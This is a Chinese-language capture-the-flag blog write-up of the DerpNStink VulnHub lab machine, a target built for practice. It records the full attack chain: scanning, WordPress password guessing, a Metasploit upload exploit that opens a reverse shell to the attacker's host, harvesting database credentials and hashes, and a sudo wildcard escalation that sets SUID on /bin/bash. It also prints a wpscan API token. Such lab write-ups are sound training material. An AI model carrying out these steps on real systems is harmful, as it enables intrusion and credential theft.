---
title: Derpnstink靶机
date: 2025/4/11/ 17:11:52
cover: /images/DerpNStink_cover.jpg
categories:
  - Writeup
tags:
  - 渗透测试
  - WordPress
  - 漏洞利用
  - Metasploit
  - Linux提权
description: "最推荐的一集"
comment: true # 默认开启，也可以显式设置
---

## 靶机发现

### Nmap 扫描结果

```bash
# Nmap 7.94SVN scan initiated Thu Apr 10 21:08:23 2025 as: nmap -sT -p21,22,80 -sC -sV -O -oA ./nmapscan/detials 192.168.55.129
Nmap scan report for 192.168.55.129
Host is up (0.00040s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: DeRPnStiNK
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
MAC Address: 00:0C:29:4A:30:F8 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 10 21:08:33 2025 -- 1 IP address (1 host up) scanned in 9.80 seconds
# Nmap 7.94SVN scan initiated Thu Apr 10 21:06:52 2025 as: nmap -sT -p- -oA ./nmapscan/ports 192.168.55.129
Nmap scan report for 192.168.55.129
Host is up (0.0038s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:4A:30:F8 (VMware)

# Nmap done at Thu Apr 10 21:07:03 2025 -- 1 IP address (1 host up) scanned in 11.22 seconds
```

## 端口探测&服务探测

### 21端口

```bash
┌──(kali㉿kali)-[~/Vulnhub_box/DerpNStink1]
└─$ ftp 192.168.55.129     
Connected to 192.168.55.129.
220 (vsFTPd 3.0.2)
Name (192.168.55.129:kali): anonymous
530 Permission denied.
ftp: Login failed
ftp> 

```

不允许匿名登录

### 22端口

```bash
┌──(kali㉿kali)-[~/Vulnhub_box/DerpNStink1]
└─$ ssh root@192.168.55.129   
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      | 
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)   
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

root@192.168.55.129: Permission denied (publickey).

```

需要公钥登录

### 80端口

- 默认 Apache 界面
- 使用 Gobuster 和 Dirsearch 爆破目录
- 发现 `/weblog` 目录为 WordPress

## web服务探测

打开是一个apache默认界面

![](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411130631763.png)

直接先用gobuster和dirsearch开始爆破一波目录

![image-20250411132637498](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411132637498.png)

这个地方遇到了一个问题，一开始我是想用gobuster来操作的，但是翻了翻help没找到咋才能让它来递归爆破。后面还是切回了dirsearch来搞，毕竟这个还是熟悉一点。gobuster确实功能比较多不止有dir模式还能爆破子域名、FUZZ模式之类的，相比之下dirsearch就比较专精了

### WordPress 用户枚举

这边是扫到了/weblog目录，打开发现是wordpress直接上了wpscan来搞

枚举用户

```bash
┌──(kali㉿kali)-[~/Vulnhub_box/DerpNStink1]
└─$ wpscan  --url http://derpnstink.local/weblog/ --api-token kD0O6cLtocayV2pMcGwfU6zXZoUytgYFZa8KGAYfhg0  -eu

```

```bash
[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

爆破密码，先用cewl生成了个字典来爆破，但是没有成功，然后就换成了rockyou

气人的是密码也是admin，我要哈气了！浪费我时间

后台登录之后发现存在**Slideshow**这个东西，然后

```bash
┌──(kali㉿kali)-[~/Vulnhub_box/DerpNStink1]                                                                    
└─$ searchsploit Slideshow                                                                                     
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path                 
----------------------------------------------------------------------------- ---------------------------------
Albinator 2.0.8 - 'showpic.php?preloadSlideShow' Cross-Site Scripting        | php/webapps/27811.txt 
Baby Katie Media VSReal and VScal 1.0 - 'myslideshow.php?title' Cross-Site S | php/webapps/28000.txt
DVD Photo Slideshow Professional 8.07 - 'Key' Buffer Overflow                | windows/local/48041.py    
DVD Photo Slideshow Professional 8.07 - 'Name' Buffer Overflow               | windows/local/48046.py
DVD Photo Slideshow Professional 8.07 - Buffer Overflow (SEH)                | windows/local/45346.py
Exponent CMS 0.97 - 'Slideshow.js.php' Cross-Site Scripting                  | php/webapps/34265.txt
Flash Slideshow Maker Professional 5.20 - Buffer Overflow (SEH)              | windows_x86/local/45355.py      
JetPhoto 1.0/2.0/2.1 - 'Slideshow.php?name' Cross-Site Scripting             | php/webapps/27618.txt
JGS-Gallery 4.0 - 'jgs_galerie_slideshow.php' Multiple Cross-Site Scripting  | php/webapps/27306.txt
Joomla! Component com_slideshow - Remote File Inclusion                      | php/webapps/4440.txt 
JV2 Folder Gallery 3.1.1 - 'popup_slideshow.php' Multiple Vulnerabilities    | php/webapps/12732.php     
Movavi VideoSuite 8.0 Slideshow - '.jpg' Local Crash (PoC)                   | windows/dos/16943.pl
PhotoPost Pro 5.1 - 'Slideshow.php?photo' Cross-Site Scripting               | php/webapps/25310.txt
PHPSlideShow 0.9.9 - 'Directory' Cross-Site Scripting                        | php/webapps/30806.txt
Socusoft 3GP Photo Slideshow 8.05 - Buffer Overflow (SEH)                    | windows_x86/local/45352.py
SocuSoft iPod Photo Slideshow 8.05 - Buffer Overflow (SEH)                   | windows_x86/local/45350.py
TWiki 5.0.2 SlideShowPlugin - Slide Show Pages URI Cross-Site Scripting      | php/webapps/36163.txt
Ultimate Fade-in Slideshow 1.51 - Arbitrary File Upload                      | php/webapps/9469.txt
uPhotoGallery 1.1 - 'Slideshow.asp?ci' SQL Injection                         | asp/webapps/29195.txt
Wedding Slideshow Studio 1.36 - 'Key' Buffer Overflow                        | windows/local/48028.py
Wedding Slideshow Studio 1.36 - 'Name' Buffer Overflow                       | windows/local/48050.py
Wedding Slideshow Studio 1.36 - Buffer Overflow                              | windows/local/45142.py
WordPress Plugin 1-jquery-photo-gallery-Slideshow-flash 1.01 - Cross-Site Sc | php/webapps/36382.txt
WordPress Plugin cnhk-Slideshow - Arbitrary File Upload                      | php/webapps/39190.php
WordPress Plugin CP Image Store with Slideshow 1.0.5 - Arbitrary File Downlo | php/webapps/37559.txt
WordPress Plugin Feature Slideshow 1.0.6 - 'src' Cross-Site Scripting        | php/webapps/35285.txt
WordPress Plugin GB Gallery Slideshow - '/wp-admin/admin-ajax.php' SQL Injec | php/webapps/39282.txt
WordPress Plugin image Gallery with Slideshow 1.5 - Multiple Vulnerabilities | php/webapps/17761.txt
WordPress Plugin LB Mixed Slideshow - 'upload.php' Arbitrary File Upload     | php/webapps/37418.php
WordPress Plugin SH Slideshow 3.1.4 - SQL Injection                          | php/webapps/17748.txt
WordPress Plugin Slideshow - Multiple Cross-Site Scripting Vulnerabilities   | php/webapps/37948.txt
WordPress Plugin Slideshow Gallery 1.1.x - 'border' Cross-Site Scripting     | php/webapps/36631.txt
WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload             | php/webapps/34514.txt
WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload             | php/webapps/34681.py
WordPress Plugin WP Easy Slideshow 1.0.3 - Multiple Vulnerabilities          | php/webapps/36612.txt
XnView 1.92.1 - 'FontName' Slideshow Buffer Overflow                         | windows/local/5346.pl
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results                                 

```

## 漏洞利用

本来想手动利用一下我一直以为是sql注入什么的漏洞，利用都没成功，开了个msf发现有个uploadfile2getshell的东西

设置好payload直接开run

```bash
Module options (exploit/unix/webapp/wp_slideshowgallery_upload):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.168.55.129   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /weblog          yes       The base path to the wordpress application
   VHOST                         no        HTTP server virtual host
   WP_PASSWORD  admin            yes       Valid password for the provided username
   WP_USER      admin            yes       A valid username


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.55.128   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WP SlideShow Gallery 1.4.6



View the full module info with the info, or info -d command.

```

```bash
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > run

[*] Started reverse TCP handler on 192.168.55.128:4444 
[*] Trying to login as admin
[*] Trying to upload payload
[*] Uploading payload
[*] Calling uploaded file myvzhfff.php
[*] Sending stage (39927 bytes) to 192.168.55.129
[+] Deleted myvzhfff.php
[*] Meterpreter session 1 opened (192.168.55.128:4444 -> 192.168.55.129:44044) at 2025-04-11 01:40:24 -0400

meterpreter > 

```

成功拿下shell

## 立足点获取

因为没怎么用过msf，所以这shell用不习惯（果然野猪吃不了细糠啊），哈气！

所以又弹了个nc到自己机器上

![image-20250411134357707](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411134357707.png)

www-data权限太低了，开始提权之旅

## 机器信息收集

用户有谁？

```bash
cat /etc/passwd |grep /bin/bash
```

```bash
<loads/slideshow-gallery$ cat /etc/passwd |grep /bin/bash                    
root:x:0:0:root:/root:/bin/bash
stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash
mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash
```

计划任务

```bash
</html/weblog/wp-content/uploads/slideshow-gallery$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

```

计划任务是空的

sudo -l问我要www-data的密码，我有个集贸密码

------

## 权限提升

### www-data

因为是wordpress想着去看看wp-config.php这个文件里面的内容

```bash
www-data@DeRPnStiNK:/var/www/html/weblog$ cat wp-config.php                                    
cat wp-config.php                                                                                              
<?php
/**     
 * The base configuration for WordPress
 * 
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.           
 *                                                                                                             
 * This file contains the following configurations:
 *                     
 * * MySQL settings
 * * Secret keys
 * * Database table prefix                  
 * * ABSPATH
 *                                                                                                             
 * @link https://codex.wordpress.org/Editing_wp-config.php                 
 *                                   
 * @package WordPress
 */                                                                                                            
                                                       
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */                                                                  
define('DB_NAME', 'wordpress');
                                                       
/** MySQL database username */
define('DB_USER', 'root');                     

/** MySQL database password */                  
define('DB_PASSWORD', 'mysql');
                                                       
/** MySQL hostname */
define('DB_HOST', 'localhost');                  
                                                       
/** Database Charset to use in creating database tables. */

```

里面有mysql的密码，那很好了（这个地方实际上前期在靶机上信息枚举的时候应该先扫一下进程，端口网络侧信息之类的，可惜忘记了）

连接上数据库

```bash
mysql -h localhost -u root -p
```

```mysql
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| phpmyadmin         |
| wordpress          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use wordpress;
use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+----------------------------+
| Tables_in_wordpress        |
+----------------------------+
| wp_commentmeta             |
| wp_comments                |
| wp_gallery_galleries       |
| wp_gallery_galleriesslides |
| wp_gallery_slides          |
| wp_links                   |
| wp_options                 |
| wp_postmeta                |
| wp_posts                   |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_termmeta                |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
+----------------------------+
15 rows in set (0.00 sec)

mysql> select * from wp_users;
select * from wp_users;
+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+
| ID | user_login  | user_pass                          | user_nicename | user_email                   | user_url | user_registered     | user_activation_key                           | user_status | display_name | flag2 |
+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+
|  1 | unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 | unclestinky   | unclestinky@DeRPnStiNK.local |          | 2017-11-12 03:25:32 | 1510544888:$P$BQbCmzW/ICRqb1hU96nIVUFOlNMKJM1 |           0 | unclestinky  |       |
|  2 | admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ | admin         | admin@derpnstink.local       |          | 2017-11-13 04:29:35 |                                               |           0 | admin        |       |
+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+
2 rows in set (0.01 sec)
```

也是成功拿到了一个叫unclestinky的用户的密码

发到hashcat爆破

```bash
hashcat -m 400 -a 0  '''$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41''' /usr/share/wordlists/rockyou.txt

```

nnd!没有破出来，正准备去搜搜怎么搞的时候想起来可以在线破解

推荐一个网站，我用起来基本上“只有”cmd5能找到的密码这里就也能找到.
https://hashes.com/zh/decrypt/hash

![image-20250411135348085](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411135348085.png)

```bash
$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41:wedgie57
```

拿着这个密码去登录stinky用户

```bash
www-data@DeRPnStiNK:/var/www/html/weblog$ su stinky
su stinky
Password: wedgie57

stinky@DeRPnStiNK:/var/www/html/weblog$ 

```

至此用户立足点获取到了

### stinky

进入家目录拿到flag.txt

这里我在家目录找到了几个有意思的文件

```wiki
┌──(kali㉿kali)-[~/Vulnhub_box/DerpNStink1]
└─$ cat interstdir.txt        
./Desktop:                                                                                                     
total 12K                                                                                                      
drwxr-xr-x  2 stinky stinky 4.0K Nov 13  2017 .                                                                
drwx------ 12 stinky stinky 4.0K Jan  9  2018 ..                                                               
-rwxr-xr-x  1 stinky stinky   72 Nov 12  2017 flag.txt


./ftp/files:                                                                                                   
total 24K                                              
drwxr-xr-x 5 stinky stinky  4.0K Nov 12  2017 .                                                                
drwxr-xr-x 3 nobody nogroup 4.0K Nov 12  2017 ..                                                               
drwxr-xr-x 2 stinky stinky  4.0K Nov 12  2017 network-logs                                                     
drwxr-xr-x 3 stinky stinky  4.0K Nov 12  2017 ssh                                                              
-rwxr-xr-x 1 root   root      17 Nov 12  2017 test.txt                                                         
drwxr-xr-x 2 root   root    4.0K Nov 12  2017 tmp    


./ftp/files/network-logs/derpissues.txt


./ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh:                                                                       
total 12K                                                                                                      
drwxr-xr-x 2 stinky stinky 4.0K Nov 13  2017 .         
drwxr-xr-x 3 stinky stinky 4.0K Nov 12  2017 ..                                                                
-rwxr-xr-x 1 root   root   1.7K Nov 13  2017 key.txt
```

一个一个看看

flag.txt

```
stinky@DeRPnStiNK:~/Desktop$ cat flag.txt
cat flag.txt
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
stinky@DeRPnStiNK:~/Desktop$ 

```
/ftp/files/network-logs/derpissues.txt
```
stinky@DeRPnStiNK:~$ cat ftp/files/network-logs/derpissues.txt
cat ftp/files/network-logs/derpissues.txt
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
stinky@DeRPnStiNK:~$ 

```

这个东西说另一个用户发现无法登录了，请求我们当前用户协助检查。我们当前用户决定启动一个sniffer来排查一下，回想到之前在家目录下面还有一个.pcap文件没有看到过，直接起个python服务器给他下载下来

wireshark打开设置好过滤器后出现三个数据包，我们来看看
![image-20250411140206421](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411140206421.png)

追踪http流可以看到mrderp的明文密码
![image-20250411140253134](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411140253134.png)

尝试利用该密码切换用户

```bash
stinky@DeRPnStiNK:~$ su mrderp
su mrderp
Password: derpderpderpderpderpderpderp

mrderp@DeRPnStiNK:/home/stinky$ 
```

### mrderp

然后重复之前的枚举步骤发现

sudo -l存在执行

```bash
[sudo] password for mrderp: derpderpderpderpderpderpderp

Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
mrderp@DeRPnStiNK:/home/stinky$ 

```

家目录下有一个能够root执行的文件，但是尝试执行时候我发现文件不存在。这个地方我们可以自己手动创建一个这个文件然后就能以root权限来执行这个文件了

```bash
User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
mrderp@DeRPnStiNK:/home/stinky$ pwd
pwd
/home/stinky
mrderp@DeRPnStiNK:/home/stinky$ cd /home
cd /home
mrderp@DeRPnStiNK:/home$ cd mrderp
cd mrderp
mrderp@DeRPnStiNK:~$ mkdir binaries
mkdir binaries
mrderp@DeRPnStiNK:~$ cd binaries
cd binaries
mrderp@DeRPnStiNK:~/binaries$ echo 'chmod +s /bin/bash' >>derpy.sh
echo 'chmod +s /bin/bash' >>derpy.sh
mrderp@DeRPnStiNK:~/binaries$ chmod +x derpy.sh
chmod +x derpy.sh
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
sudo ./derpy.sh
mrderp@DeRPnStiNK:~/binaries$ /bin/bash -p
/bin/bash -p
bash-4.3# id
id
uid=1000(mrderp) gid=1000(mrderp) euid=0(root) egid=0(root) groups=0(root),1000(mrderp)
```

至此提权成功

### root_flag

```bash
bash-4.3# cat flag.txt
cat flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!

Hit me up on twitter and let me know your thoughts!

@securekomodo


bash-4.3# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:4a:30:f8 brd ff:ff:ff:ff:ff:ff
    inet 192.168.55.129/24 brd 192.168.55.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe4a:30f8/64 scope link 
       valid_lft forever preferred_lft forever
bash-4.3# 

```

## 总结复盘

这个靶机提权部分对我来说还是很有意思的，能用到之前学过的很多东西，至少让我觉得我真的有学到些什么了。中间看了两次wp，一次是pcap文件的发现，我第一次压根没注意到这个东西虽然看到了他俩的对话文件但是没有想到要搜索这些。另一次是root的提权，还是因为没有系统性的学过Linux的提权方法所以没有想到可以自己手动创建文件来执行。

总的来说是一次很流畅的打靶，就是时间用的有点太多了，前前后后从早上9：00开始到11：20才拿下root_shell。操作连贯性还是有待加强

这个命令来全览看文件确实好用

```bash
ls -laRh
```

